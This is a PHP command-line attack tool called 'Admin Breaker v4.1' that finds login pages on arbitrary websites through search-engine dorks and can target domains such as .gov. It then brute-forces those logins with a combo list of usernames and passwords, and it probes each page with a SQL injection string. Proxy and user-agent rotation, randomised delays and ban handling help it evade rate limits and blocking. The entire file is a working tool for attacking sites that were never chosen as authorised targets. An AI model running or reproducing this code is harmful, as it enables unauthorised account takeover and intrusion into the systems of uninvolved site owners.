
<?php
#!/usr/bin/env php
/**
 * Admin Breaker v4.1 Ultimate MixHunter
 * By 0x6ick x NyxCode (2025) - Upgraded banList handling
 * PHP7+, CLI
 */

// ---------------------
// CONFIG & CONSTANTS
// ---------------------

// ANSI Colors
define('C_RESET',  "\033[0m");
define('C_RED',    "\033[31m");
define('C_GREEN',  "\033[32m");
define('C_YELLOW', "\033[33m");
define('C_BLUE',   "\033[34m");

// Delay & ban threshold
$minDelay     = 5;
$maxDelay     = 12;
$banThreshold = 3;

// Data files & outputs
$dorkMini    = 'dorklist_mini.txt';
$dorkFull    = 'dorklist.txt';
$comboFile   = 'combo.txt';
$proxyFile   = 'proxies.txt';

$outputTargets = 'targets.txt';
$outputSuccess = 'success.txt';
$outputFail    = 'fail.txt';
$outputBan     = 'ban.txt';
$outputCaptcha = 'captcha.txt';
$outputSQLi    = 'sqli.txt';

// Search engines
$engines = [
    'google' => 'https://www.google.com/search?q=%s&num=20',
    'bing'   => 'https://www.bing.com/search?q=%s&count=20',
    'duck'   => 'https://duckduckgo.com/html/?q=%s'
];

// User agents
$userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64)',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)',
    'Mozilla/5.0 (Linux; Android 10; SM-G973F)'
];

// Banlist domains
$banList = [
    'github.com','exploit-db.com',
    'support.microsoft.com','baidu.com','answers.microsoft.com',
    'jingyan.baidu.com','devforum.roblox.com','stackoverflow.com'
];

// Ensure clean outputs
foreach ([$outputTargets,$outputSuccess,$outputFail,$outputBan,$outputCaptcha,$outputSQLi] as $f) {
    @file_put_contents($f, '');
}

// ---------------------
// HELPERS
// ---------------------

function writeLog($file, $data) {
    file_put_contents($file, $data . PHP_EOL, FILE_APPEND);
}

function loadList($file) {
    if (!file_exists($file)) {
        fwrite(STDERR, C_RED."[-] Missing file: {$file}\n".C_RESET);
        exit(1);
    }
    return file($file, FILE_IGNORE_NEW_LINES|FILE_SKIP_EMPTY_LINES);
}

function httpRequest($url, $post=null, $proxy=null) {
    global $userAgents;
    $ua = $userAgents[array_rand($userAgents)];
    $opts = ['http'=>['header'=>"User-Agent: $ua\r\n",'timeout'=>10]];
    if ($post!==null) {
        $opts['http']['method']  = 'POST';
        $opts['http']['header'].= "Content-Type: application/x-www-form-urlencoded\r\n";
        $opts['http']['content']= http_build_query($post);
    }
    if ($proxy) {
        $opts['http']['proxy']         = "tcp://$proxy";
        $opts['http']['request_fulluri']= true;
    }
    return @file_get_contents($url,false,stream_context_create($opts));
}

/**
 * Check if a URL's host matches any banned domain substring
 */
function isBannedHost($url) {
    global $banList;
    $host = parse_url($url, PHP_URL_HOST);
    if (!$host) return false;
    foreach ($banList as $b) {
        if (stripos($host, $b) !== false) {
            return true;
        }
    }
    return false;
}

function handleBan($context, $httpCode) {
    global $banThreshold, $outputBan;
    static $banCount = 0;
    if (in_array($httpCode,[403,429])) {
        $banCount++;
        echo C_RED."[!] Ban detected ($httpCode) from ".parse_url($context,PHP_URL_HOST)." | Count: $banCount\n".C_RESET;
        writeLog($outputBan, "$context | HTTP $httpCode");
        if ($banCount >= $banThreshold) {
            echo C_YELLOW."[!] Exceeded ban threshold. Sleeping 60s...\n".C_RESET;
            sleep(60);
            $banCount = 0;
        }
    }
}

function pauseMsg($context) {
    global $minDelay, $maxDelay;
    $sec  = rand($minDelay, $maxDelay);
    $host = parse_url($context, PHP_URL_HOST) ?: $context;
    echo C_YELLOW."[~] Jeda {$sec}s untuk {$host}...\n".C_RESET;
    for ($i=0;$i<=$sec;$i++){
        $bar = str_repeat('█',$i).str_repeat(' ',$sec-$i);
        printf("\r[%s] %2ds",$bar,$i);
        flush();
        sleep(1);
    }
    echo "\n".C_GREEN."[+] Lanjut setelah {$sec}s\n".C_RESET;
}

function showProgressBar($current,$total,$width=30) {
    $perc = $total>0?($current/$total):0;
    $done = floor($perc*$width);
    $bar  = str_repeat('█',$done).str_repeat('-',$width-$done);
    printf("\r[%s] %3d%% (%d/%d)",$bar,round($perc*100),$current,$total);
    if ($current===$total) echo "\n";
}

// ---------------------
// BANNER & SETTINGS
// ---------------------
echo str_repeat('=',50)."\n";
echo C_BLUE."  Admin Breaker v4.1 Ultimate MixHunter\n".C_RESET;
echo C_BLUE."  By 0x6ick x NyxCode (2025)\n".C_RESET;
echo str_repeat('=',50)."\n\n";

// Interactive: dorklist & domain filter
$choice       = readline(C_YELLOW."[?] Pilih Dorklist: (1) Mini  (2) Full: ".C_RESET);
$dorkFile     = ($choice==='1')?$dorkMini:$dorkFull;
$domainFilter = readline(C_YELLOW."[?] Filter domain (misal .in,.gov; kosong=all): ".C_RESET);

// Load inputs
$dorks   = loadList($dorkFile);
$combos  = loadList($comboFile);
$proxies = file_exists($proxyFile)?loadList($proxyFile):[];
$targets = [];

// ---------------------
// PHASE 1: DORK & FILTER
// ---------------------
$totalJobs = count($dorks)*count($engines);
$jobCount  = 0;
echo C_BLUE."[+] Phase1: Dork & Filter (Jobs: {$totalJobs})\n".C_RESET;
foreach ($dorks as $dork) {
    foreach ($engines as $name=>$pattern) {
        $jobCount++;
        showProgressBar($jobCount,$totalJobs);
        $url = sprintf($pattern,urlencode($dork));
        if (isBannedHost($url)) {
            echo C_RED." Skipped banned source: ".parse_url($url,PHP_URL_HOST)."\n".C_RESET;
            continue;
        }
        $html = httpRequest($url,null, $proxies? $proxies[array_rand($proxies)]:null);
        if (!$html) continue;
        if (stripos($html,'captcha')!==false) {
            writeLog($outputCaptcha,$url);
            pauseMsg($url);
            continue;
        }
        preg_match_all('/href="(https?:\\/\\/[^"\\?]+)"/i',$html,$m);
        foreach ($m[1] as $link) {
            if (isBannedHost($link)) {
                echo C_RED."  Skipped banned target: ".parse_url($link,PHP_URL_HOST)."\n".C_RESET;
                continue;
            }
            if ($domainFilter && stripos($link,$domainFilter)===false) continue;
            if (in_array($link,$targets)) continue;
            $page = httpRequest($link,null, $proxies? $proxies[array_rand($proxies)]:null);
            if ($page && preg_match('/(<input[^>]+type=["\']?password|login|username)/i',$page)) {
                $targets[] = $link;
                writeLog($outputTargets,$link);
                echo C_GREEN."  [+] Target found: {$link}\n".C_RESET;
            }
            pauseMsg($link);
        }
        pauseMsg($url);
    }
}
echo C_BLUE."[+] Phase1 done: ".count($targets)." targets\n\n".C_RESET;

// ---------------------
// PHASE 2: BRUTE FORCE
// ---------------------
$totalAttempts = count($targets)*count($combos);
$attemptCount  = 0;
echo C_BLUE."[+] Phase2: Brute Force (Total attempts: {$totalAttempts})\n".C_RESET;
foreach ($targets as $tgt) {
    echo C_YELLOW."[*] Target: {$tgt}\n".C_RESET;
    foreach ($combos as $c) {
        $attemptCount++;
        showProgressBar($attemptCount,$totalAttempts);
        list($u,$p) = strpos($c,'|')!==false?explode('|',$c,2):explode(':',$c,2);
        $res = httpRequest($tgt,['username'=>trim($u),'password'=>trim($p)], $proxies? $proxies[array_rand($proxies)]:null);
        if ($res && preg_match('/(dashboard|logout|admin-panel)/i',$res)) {
            echo C_GREEN."    [+] SUCCESS: {$u}|{$p}\n".C_RESET;
            writeLog($outputSuccess,"{$tgt} | {$u}|{$p}");
            break;
        } else {
            echo C_RED."    [-] FAIL: {$u}|{$p}\n".C_RESET;
            writeLog($outputFail,"{$tgt} | {$u}|{$p}");
        }
        pauseMsg($tgt);
    }
}
echo C_BLUE."[+] Phase2 done\n\n".C_RESET;

// ---------------------
// PHASE 3: SQLi CHECK
// ---------------------
$sqlCount = 0;
$totalSQL = count($targets);
echo C_BLUE."[+] Phase3: SQLi Check (Targets: {$totalSQL})\n".C_RESET;
foreach ($targets as $link) {
    $sqlCount++;
    showProgressBar($sqlCount,$totalSQL);
    $testUrl = rtrim($link,"/").urlencode("'+OR+1=1--");
    $res = httpRequest($testUrl);
    $code = isset($http_response_header[0])? (int)explode(" ",$http_response_header[0])[1] : 0;
    handleBan($link,$code);
    pauseMsg($link);
    if ($res && preg_match('/(SQL syntax|mysql_fetch_array|ORA-00933|Unknown column|SQLSTATE)/i',$res)) {
        echo C_RED."    [+] POSSIBLE SQLi: {$link}\n".C_RESET;
        writeLog($outputSQLi,$link);
    } else {
        echo C_GREEN."    [-] No SQLi: {$link}\n".C_RESET;
    }
}
echo C_BLUE."[+] All phases complete\n".C_RESET;
?>
